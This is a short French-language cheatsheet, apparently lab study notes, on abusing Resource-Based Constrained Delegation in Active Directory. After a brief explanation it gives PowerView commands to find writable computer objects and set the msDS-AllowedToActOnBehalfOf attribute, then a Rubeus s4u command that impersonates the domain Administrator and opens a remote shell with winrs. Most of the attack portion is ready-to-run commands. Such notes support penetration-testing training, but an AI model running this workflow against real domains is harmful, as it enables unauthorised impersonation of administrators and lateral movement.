# Cheatsheet - RBCD

> [!summary] Objectif
> Resource-Based Constrained Delegation : contrairement à la delegation classique (définie sur le compte qui délègue), c'est ici l'objet **cible** qui déclare, via son attribut `msDS-AllowedToActOnBehalfOf`, quels comptes ont le droit de s'authentifier en son nom. Un simple droit d'écriture (`GenericWrite`) sur cet attribut suffit à s'y ajouter soi-même — puis à usurper n'importe quel user du domaine (y compris Administrator) face à cette machine précise. Workflow : find write → set RBCD → verify → Rubeus s4u.

> [!warning]- Required
> Un droit d'écriture (`GenericWrite`/`GenericAll`) sur l'objet computer cible — à repérer via [[Cheatsheet - ACL et droits AD]] ou BloodHound ([[Cheatsheet - BloodHound SharpHound]]). Un compte machine que l'on contrôle déjà (pour le `/aes256` du s4u) suffit comme "attaquant".

### Find the write path

```powershell
. C:\AD\Tools\PowerView.ps1
Find-InterestingDomainACL | Where-Object {$_.IdentityReferenceName -match 'ciadmin'}
```

### Configure RBCD

```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
Get-DomainRBCD
```

### Abuse with Rubeus

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-studentX$ /aes256:<AES256_KEY> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
winrs -r:dcorp-mgmt cmd
```

> [!note] Récupérer d'abord les clés machine de la student VM avant le s4u. Noter : object controlled, delegated machine, SPN target, user impersonated.

## Related
- [[Cheatsheet - Delegation attacks]]
- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Trusts et forêts]]
